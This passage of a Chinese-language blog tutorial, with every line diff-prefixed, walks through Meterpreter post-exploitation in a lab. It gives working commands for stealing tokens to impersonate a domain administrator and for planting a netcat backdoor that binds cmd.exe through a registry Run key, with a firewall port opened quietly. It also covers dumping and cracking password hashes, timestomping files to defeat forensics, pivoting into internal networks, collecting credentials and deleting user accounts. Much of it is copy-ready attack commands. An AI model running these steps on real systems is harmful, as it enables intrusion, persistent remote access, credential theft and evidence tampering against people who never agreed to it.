+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222132619587.png" alt="image-20230222132619587"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222132734844.png" alt="image-20230222132734844"></p>
+<h2 id="Tokens"><a href="#Tokens" class="headerlink" title="Tokens"></a>Tokens</h2><blockquote>
+<ul>
+<li>Tokens<ul>
+<li>用户每次登录，账号绑定临时的Token</li>
+<li>访问资源时提交Token进行身份验证，类似于WEB Cookie</li>
+<li>Delegate(委派) Token：交互登录会话；例如本地登录&#x2F;RDP登录</li>
+<li>Impersonate Token：非交互登录会话；例如访问文件共享</li>
+<li>Delegate Token账号注销后变为Impersonate Token，权限依然有效</li>
+</ul>
+</li>
+<li>Incognito<ul>
+<li>独立功能的软件，被MSF集成在meterpreter中，用于Token窃取</li>
+<li>无需密码破解或获取密码HASH，窃取Token将自己伪装成其他用户</li>
+<li>尤其适用于域环境下提权渗透多操作系统</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="搭建域环境"><a href="#搭建域环境" class="headerlink" title="搭建域环境"></a>搭建域环境</h3><h4 id="安装域控"><a href="#安装域控" class="headerlink" title="安装域控"></a>安装域控</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222140445749.png" alt="image-20230222140445749"></p>
+<h4 id="加入域"><a href="#加入域" class="headerlink" title="加入域"></a>加入域</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222140502369.png" alt="image-20230222140502369"></p>
+<h4 id="创建域用户"><a href="#创建域用户" class="headerlink" title="创建域用户"></a>创建域用户</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222140735241.png" alt="image-20230222140735241"></p>
+<h3 id="获取所有Token"><a href="#获取所有Token" class="headerlink" title="获取所有Token"></a>获取所有Token</h3><blockquote>
+<p>想要获取所有Token，必须取得域用户的管理员权限</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">getsystem              # 提权
+load incognito         # 加载incognito插件
+list_tokens -u		   # 列出所有存活Token
+impersonate_token lab\\administrator   # 伪造域控token
+execute -f cmd.exe -i -t    # -t：使用当前假冒的token执行程序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="注册表修改"><a href="#注册表修改" class="headerlink" title="注册表修改"></a>注册表修改</h2><blockquote>
+<ul>
+<li>注册表保存着windows几乎全部配置参数<ul>
+<li>如果修改不当，可直接造成系统崩溃</li>
+<li>修改前完整备份注册表</li>
+<li>某些注册表的修改是不可逆的</li>
+</ul>
+</li>
+<li>常见用途<ul>
+<li>修改、增加启动项</li>
+<li>窃取存储于注册表中的机密信息（浏览器记住的密码存储在注册表）</li>
+<li>绕过文件型病毒查杀</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="利用注册表添加NC后门"><a href="#利用注册表添加NC后门" class="headerlink" title="利用注册表添加NC后门"></a>利用注册表添加NC后门</h3><blockquote>
+<p>思路：首先将nc传到目标系统，再编辑注册表，使nc每次随着win7重启时候都能够将nc以后台程序的形式启动起来，侦听一个指定的端口</p>
+<p>适用于ip不固定的主机，使目标主机主动连接攻击者</p>
+</blockquote>
+<h4 id="上传nc"><a href="#上传nc" class="headerlink" title="上传nc"></a>上传nc</h4><pre class="line-numbers language-none"><code class="language-none">upload &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;nc.exe C:\\windows\\system32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222185127645.png" alt="image-20230222185127645"></p>
+<h4 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h4><blockquote>
+<p><strong>双斜线表示转义符</strong></p>
+<p><strong>修改完注册表之后重启立即生效</strong></p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39;
+
+reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc   # 查询nc子键是否插入成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222185539182.png" alt="image-20230222185539182"></p>
+<h4 id="打开防火墙端口"><a href="#打开防火墙端口" class="headerlink" title="打开防火墙端口"></a>打开防火墙端口</h4><blockquote>
+<p>不关闭防火墙，只打开对应的侦听端口，达到隐蔽性</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">execute -f cmd -i -H         # 隐蔽打开cmd
+netsh firewall show opmode   # 查询防火墙是否开启<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222190945087.png" alt="image-20230222190945087"></p>
+<pre class="line-numbers language-none"><code class="language-none">netsh firewall add portopening TCP 444 &quot;test&quot; ENABLE ALL # 添加防火墙策略并启动<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222191209551.png" alt="image-20230222191209551"></p>
+<pre class="line-numbers language-none"><code class="language-none">shutdown -r -t 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222191557456.png" alt="image-20230222191557456"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222191644392.png" alt="image-20230222191644392"></p>
+<h4 id="nc连接"><a href="#nc连接" class="headerlink" title="nc连接"></a>nc连接</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222191811498.png" alt="image-20230222191811498"></p>
+<h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><h3 id="加载sniffer插件"><a href="#加载sniffer插件" class="headerlink" title="加载sniffer插件"></a>加载sniffer插件</h3><pre class="line-numbers language-none"><code class="language-none">load sniffer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222193648185.png" alt="image-20230222193648185"></p>
+<h3 id="查看网卡并启动"><a href="#查看网卡并启动" class="headerlink" title="查看网卡并启动"></a>查看网卡并启动</h3><blockquote>
+<p>在内存中缓存区块循环存储抓包（50000包），不写硬盘</p>
+<p>智能过滤meterpreter流量，只抓取目标系统数据包，传输全程使用SSL&#x2F;TLS加密</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222193809677.png" alt="image-20230222193809677"></p>
+<h3 id="Dump抓到的包"><a href="#Dump抓到的包" class="headerlink" title="Dump抓到的包"></a>Dump抓到的包</h3><blockquote>
+<p>需要及时下载到本地抓不到的包，只保存50000个包</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222194155670.png" alt="image-20230222194155670"></p>
+<h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;sniffer&#x2F;psnuffle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222195000624.png" alt="image-20230222195000624"></p>
+<h2 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h2><pre class="line-numbers language-none"><code class="language-none">search -f *.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222195312891.png" alt="image-20230222195312891"></p>
+<pre class="line-numbers language-none"><code class="language-none">search -d C:\\Windows\\en-US -f *.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222195613054.png" alt="image-20230222195613054"></p>
+<h2 id="John-the-Ripper-破解弱口令"><a href="#John-the-Ripper-破解弱口令" class="headerlink" title="John the Ripper 破解弱口令"></a>John the Ripper 破解弱口令</h2><blockquote>
+<p>只是检查目标系统是否使用了常见的弱口令</p>
+</blockquote>
+<h3 id="获取hash值"><a href="#获取hash值" class="headerlink" title="获取hash值"></a>获取hash值</h3><pre class="line-numbers language-none"><code class="language-none">hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222202218951.png" alt="image-20230222202218951"></p>
+<pre class="line-numbers language-none"><code class="language-none">use  post&#x2F;windows&#x2F;gather&#x2F;hashdump
+此模块获取的hash值默认保存在&#x2F;tmp目录下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222202505423.png" alt="image-20230222202505423"></p>
+<h3 id="使用JTR模块破解"><a href="#使用JTR模块破解" class="headerlink" title="使用JTR模块破解"></a>使用JTR模块破解</h3><blockquote>
+<p>此模块会默认调用保存在&#x2F;tmp目录下的hash文件</p>
+<p>新版本的msf此模块使用不了，可是在msf之外进行破解</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;analyze&#x2F;jtr_crack_fast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><blockquote>
+<ul>
+<li><p>文件系统访问会留下痕迹，电子取证重点关注</p>
+</li>
+<li><p>渗透测试和攻击者往往希望销毁文件系统访问痕迹</p>
+</li>
+<li><p>最好的避免被电子取证发现的发放：不要碰文件系统</p>
+<ul>
+<li>Meterpreter 的先天优势所在（完全基于内存）</li>
+</ul>
+</li>
+<li><p>MAC 时间（Modified &#x2F; Accessed &#x2F; Changed）</p>
+<ul>
+<li><p>修改文件内容会产生Modified时间，系统会记录Modified时间</p>
+</li>
+<li><p>只对文件访问会产生Accessed时间，系统会记录Accessed时间</p>
+</li>
+<li><p>修改文件属性会产生Changed时间，系统会记录Changed时间</p>
+<p>（文件属性表示权限等文件内在信息）</p>
+</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="查看-MAC-时间"><a href="#查看-MAC-时间" class="headerlink" title="查看 MAC 时间"></a>查看 MAC 时间</h3><h4 id="mtime"><a href="#mtime" class="headerlink" title="mtime"></a>mtime</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222204905554.png" alt="image-20230222204905554"></p>
+<h4 id="atime"><a href="#atime" class="headerlink" title="atime"></a>atime</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222204921949.png" alt="image-20230222204921949"></p>
+<h4 id="ctime"><a href="#ctime" class="headerlink" title="ctime"></a>ctime</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222204942411.png" alt="image-20230222204942411"></p>
+<h4 id="stat"><a href="#stat" class="headerlink" title="stat"></a>stat</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222205118991.png" alt="image-20230222205118991"></p>
+<h3 id="修改-MAC-时间"><a href="#修改-MAC-时间" class="headerlink" title="修改 MAC 时间"></a>修改 MAC 时间</h3><h4 id="按天修改"><a href="#按天修改" class="headerlink" title="按天修改"></a>按天修改</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222205428027.png" alt="image-20230222205428027"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222205639508.png" alt="image-20230222205639508"></p>
+<h4 id="按时间修改"><a href="#按时间修改" class="headerlink" title="按时间修改"></a>按时间修改</h4><p><code>touch -t 1501010101</code></p>
+<blockquote>
+<p>每两个数字为一个单位：年&#x2F;月&#x2F;日&#x2F;时&#x2F;分</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222210009056.png" alt="image-20230222210009056"></p>
+<h3 id="Msf-修改-MAC-时间"><a href="#Msf-修改-MAC-时间" class="headerlink" title="Msf 修改 MAC 时间"></a>Msf 修改 MAC 时间</h3><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222210335772.png" alt="image-20230222210335772"></p>
+<h4 id="查看-MAC"><a href="#查看-MAC" class="headerlink" title="查看 MAC"></a>查看 MAC</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222210620882.png" alt="image-20230222210620882"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222210729081.png" alt="image-20230222210729081"></p>
+<blockquote>
+<p>MAC<strong>E</strong>：<strong>E</strong>表示MFT entry</p>
+<p>MFT：NTFS 文件系统的主文件分配表 Master File Table</p>
+<p>通常1024字节或2个硬盘扇区，其中存放多项 entry 信息（entry表示很多项）</p>
+<p>Entry包含文件大量信息（大小 名称 目录位置 磁盘位置 创建日期），这些信息只要被修改就会修改<strong>E</strong>(Entry)时间</p>
+<p>更多信息可研究文件系统取证分析技术</p>
+</blockquote>
+<h4 id="基于模板修改-MAC"><a href="#基于模板修改-MAC" class="headerlink" title="基于模板修改 MAC"></a>基于模板修改 MAC</h4><pre class="line-numbers language-none"><code class="language-none">timestomp -f c:\\autorun.inf 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>-f：修改为模板时间，此模板是什么时间，1.txt就会被修改为什么时间</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222212832342.png" alt="image-20230222212832342"></p>
+<h4 id="指定时间修改-MAC"><a href="#指定时间修改-MAC" class="headerlink" title="指定时间修改 MAC"></a>指定时间修改 MAC</h4><pre class="line-numbers language-none"><code class="language-none">timestomp -z &quot;MM&#x2F;DD&#x2F;YYYY HH24:MI:SS&quot; 2.txt
+-m &#x2F; -a &#x2F; -c &#x2F; -e &#x2F; -z 可单个修改，也可使用-z全部修改<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>1111年计算机还没诞生</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222213237199.png" alt="image-20230222213237199"></p>
+<h4 id="擦除-MACE"><a href="#擦除-MACE" class="headerlink" title="擦除 MACE"></a>擦除 MACE</h4><pre class="line-numbers language-none"><code class="language-none">-b和-r参数：-b擦除文件MACE时间；-r擦除整个文件夹MACE时间；目前这两个参数已失效<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222213817759.png" alt="image-20230222213817759"></p>
+<h2 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h2><blockquote>
+<p>利用已经控制的一台计算机作为入侵内网的 跳板</p>
+<p>在其他内网计算机看来访问全部来自于 跳板机</p>
+</blockquote>
+<h3 id="场景描述"><a href="#场景描述" class="headerlink" title="场景描述"></a>场景描述</h3><blockquote>
+<p>假设攻击者已经控制了win7主机，并且防火墙只允许win7主机访问外网，就可以利用win7主机攻击XP，XP返回的信息也会通过win7这个支点返回给攻击者</p>
+<p>由于设备资源有限，无法搭建太多主机，只有攻击者，跳板机和受害机。</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222214751876.png" alt="image-20230222214751876"></p>
+<h3 id="自动路由"><a href="#自动路由" class="headerlink" title="自动路由"></a>自动路由</h3><blockquote>
+<p>此时已经取得win7主机的session，基于攻击者与win7之间的session，在攻击端添加一条路由，这条路由只适用于msf内部使用，凡是到目标内部网段的通信请求都添加路由，也就是说都经过取得的session进行路由通信。</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">run autoroute -s 192.168.216.0&#x2F;24
+use post&#x2F;multi&#x2F;manage&#x2F;autoroute
+-s：指目标网段的IP
+凡是发送到192.168.216.0&#x2F;24此网段的通信请求都会通过win7转发到内网其他主机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222231025806.png" alt="image-20230222231025806"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222223620219.png" alt="image-20230222223620219"></p>
+<h4 id="扫描内网"><a href="#扫描内网" class="headerlink" title="扫描内网"></a>扫描内网</h4><blockquote>
+<p>此时已经建立起了自动路由功能，凡是发送到192.168.216.0&#x2F;24此网段的通信请求都会通过win7转发到内网其他主机，在这样情况下直接扫描内网</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222224116683.png" alt="image-20230222224116683"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222230530962.png" alt="image-20230222230530962"></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><blockquote>
+<p>扫描完成之后发现455端口开放，可能存在ms08-067，就可以通过跳板机利用漏洞，由于防火墙不允许内网主机出网，因此攻击者就算利用了漏洞，受害机因为无法反弹shell，基于这样的情况在配置<code>LHOST</code>时提前设置，可以放在攻击者边界防火墙的出口端口上，若还是接收不到shell就可以将<code>LHOST</code>直接设置为跳板机的ip，跳板机与受害机处于同网段，就可以接收受害机反弹的shell，进而通过路由再反弹给攻击者。</p>
+</blockquote>
+<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><blockquote>
+<p>利用已经被控主机，在kali与被攻击目标之间实现端口转发</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222231244045.png" alt="image-20230222231244045"></p>
+<h4 id="添加端口映射"><a href="#添加端口映射" class="headerlink" title="添加端口映射"></a>添加端口映射</h4><blockquote>
+<p>本机的3389端口映射到192.168.216.157的3389端口，只要连接本机的3389即可</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">portfwd add -L 192.168.216.171 -l 3389 -r 192.168.216.157 -p 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222231902617.png" alt="image-20230222231902617"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222231947619.png" alt="image-20230222231947619"></p>
+<blockquote>
+<p>不添加本地ip的话会自动设置为0.0.0.0</p>
+</blockquote>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222232122543.png" alt="image-20230222232122543"></p>
+<h4 id="删除端口转发"><a href="#删除端口转发" class="headerlink" title="删除端口转发"></a>删除端口转发</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222232314200.png" alt="image-20230222232314200"></p>
+<h2 id="POST模块"><a href="#POST模块" class="headerlink" title="POST模块"></a>POST模块</h2><blockquote>
+<p>专门用于后渗透的模块，所有模块使用<code>run</code>命令执行</p>
+</blockquote>
+<h3 id="Arp-Scan"><a href="#Arp-Scan" class="headerlink" title="Arp_Scan"></a>Arp_Scan</h3><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.216.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222233128937.png" alt="image-20230222233128937"></p>
+<h3 id="Check-VM"><a href="#Check-VM" class="headerlink" title="Check_VM"></a>Check_VM</h3><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;checkvm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222233147561.png" alt="image-20230222233147561"></p>
+<h3 id="扫描身份验证信息"><a href="#扫描身份验证信息" class="headerlink" title="扫描身份验证信息"></a>扫描身份验证信息</h3><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;credential_collector<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222233231578.png" alt="image-20230222233231578"></p>
+<h3 id="枚举APP应用"><a href="#枚举APP应用" class="headerlink" title="枚举APP应用"></a>枚举APP应用</h3><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222233335090.png" alt="image-20230222233335090"></p>
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222233358856.png" alt="image-20230222233358856"></p>
+<h3 id="检查登录状态主机"><a href="#检查登录状态主机" class="headerlink" title="检查登录状态主机"></a>检查登录状态主机</h3><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222233508075.png" alt="image-20230222233508075"></p>
+<h3 id="枚举SNMP服务"><a href="#枚举SNMP服务" class="headerlink" title="枚举SNMP服务"></a>枚举SNMP服务</h3><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;enum_snmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222233624449.png" alt="image-20230222233624449"></p>
+<h3 id="扫描本地提权漏洞"><a href="#扫描本地提权漏洞" class="headerlink" title="扫描本地提权漏洞"></a>扫描本地提权漏洞</h3><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222233937911.png" alt="image-20230222233937911"></p>
+<h3 id="删除目标用户账号"><a href="#删除目标用户账号" class="headerlink" title="删除目标用户账号"></a>删除目标用户账号</h3><h4 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h4><p><img src="/2023/02/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%90%8E%E6%B8%97%E9%80%8F%E3%80%91/image-20230222234204266.png" alt="image-20230222234204266"></p>
+<h4 id="删除目标用户"><a href="#删除目标用户" class="headerlink" title="删除目标用户"></a>删除目标用户</h4><blockquote>
+<p>若删除了已经存活的账号，不会因为删除而立刻注销掉，等下次登录的时候就不会有登录信息了</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;manage&#x2F;delete_user USERNAME&#x3D;&lt;目标用户名&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
